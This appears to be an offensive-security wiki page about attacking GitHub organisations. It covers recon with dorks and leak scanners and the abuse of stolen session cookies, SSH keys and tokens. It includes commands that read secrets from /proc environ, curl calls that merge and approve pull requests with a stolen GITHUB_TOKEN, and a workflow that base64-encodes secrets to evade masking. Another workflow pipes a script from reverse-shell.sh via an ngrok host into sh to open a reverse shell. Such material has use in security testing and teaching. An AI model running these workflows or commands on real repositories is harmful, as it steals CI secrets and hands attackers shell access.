# Github Security

## What is Github

(From [here](https://kinsta.com/knowledgebase/what-is-github/)) At a high level, **GitHub is a website and cloud-based service that helps developers store and manage their code, as well as track and control changes to their code**.

### Basic Information

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## External Recon

Github repositories can be configured as public, private and internal.&#x20;

* **Private** means that **only** people of the **organisation** will be able to access them
* **Internal** means that **only** people of the **enterprise** (an enterprise may have several organisations) will be able to access it
* **Public** means that **all internet** is going to be able to access it.

In case you know the **user, repo or organisation you want to target** you can use **github dorks** to find sensitive information or search for **sensitive information leaks** **on each repo**.

### Github Dorks

Github allows to **search for something specifying as scope a user, a repo or an organisation**. Therefore, with a list of strings that are going to appear close to sensitive information you can easily **search for potential sensitive information in your target**.

Tools (each tool contains its list of dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Dorks list](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Dorks list](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Github Leaks

Please, note that the github dorks are also meant to search for leaks using github search options. This section is dedicated to those tools that will **download each repo and search for sensitive information in them** (even checking certain depth of commits).

Tools (each tool contains its list of regexes):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

## Internal Recon

### With User Credentials

If you somehow already have credentials for a user inside an organization you can **just login** and check which **enterprise and organization roles you have**, if you are a raw member, check which **permissions raw members have**, in which **groups** you are, which **permissions you have** over which **repos,** and **how are the repos protected.**

Note that **2FA may be used** so you will only be able to access this information if you can also **pass that check**.

{% hint style="info" %}
Note that if you **manage to steal the `user_session` cookie** (currently configured with SameSite: Lax) you can **completely impersonate the user** without needing credentials or 2FA.
{% endhint %}

### With User SSH Key

Github allows **users** to set **SSH keys** that will be used as **authentication method to deploy code** on their behalf (no 2FA is applied).

With this key you can perform **changes in repositories where the user has some privileges**, however you can not sue it to access github api to enumerate the environment. However, you can get **enumerate local settings** to get information about the repos and user you have access to:

```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```

If the user has configured its username as his github username you can access the **public keys he has set** in his account in _https://github.com/\<github\_username>.keys_, you could check this to confirm the private key you found can be used.

**SSH keys** can also be set in repositories as **deploy keys**. Anyone with access to this key will be able to **launch projects from a repository**. Usually in a server with different deploy keys the local file **`~/.ssh/config`** will give you info about key is related.

#### GPG Keys

As explained [**here**](basic-github-information.md#ssh-keys) sometimes it's needed to sign the commits or you might get discovered.

Check locally if the current user has any key with:&#x20;

```shell
gpg --list-secret-keys --keyid-format=long
```

### With User Token

For an introduction about [**User Tokens check the basic information**](basic-github-information.md#personal-access-tokens).

A user token can be used **instead of a password** for Git over HTTPS, or can be used to [**authenticate to the API over Basic Authentication**](https://docs.github.com/v3/auth/#basic-authentication). Depending on the privileges attached to it you might be able to perform different actions.

A User token looks like this: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### With Oauth Application



### With Github Application

### With Malicious Github Action

For an introduction about [**Github Actions check the basic information**](basic-github-information.md#git-actions).

In case you can **execute arbitrary github actions** in a **repository**, you can **steal the secrets from that repo**.

In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.

In case you somehow managed to **infiltrate inside a Github Action**, if you can escalate privileges you can **steal secrets from the processes where secrets have been set in**. In some cases you don't even need to escalate privileges.

```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```

#### GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is widely used to **give** (mostly read) to the **Action access to the repo**. This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

```bash
# Merge PR
curl -X PUT
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"event":"APPROVE"}'
```

{% hint style="danger" %}
Note that in several occasions you will be able to find **github user tokens inside Github Actions envs or in the secrets**. These tokens may give you more privileges over the repository and organization.
{% endhint %}

#### List secrets in Github Action output

```yaml
name: list_env
on:
  workflow_dispatch:
jobs:     
  List_env:
    runs-on: ubuntu-latest
    steps:
      - name: List Env
        # Need to base64 encode or github will change the secret value for "***"
        run: sh -c 'env | grep "secret_" | base64 -w0'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

#### Get reverse shell with secrets

```yaml
name: revshell
on:
  workflow_dispatch:
jobs:     
  create_pull_request:
    runs-on: ubuntu-latest
    steps:
      - name: Get Rev Shell
        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

### Bypassing Branch Protection
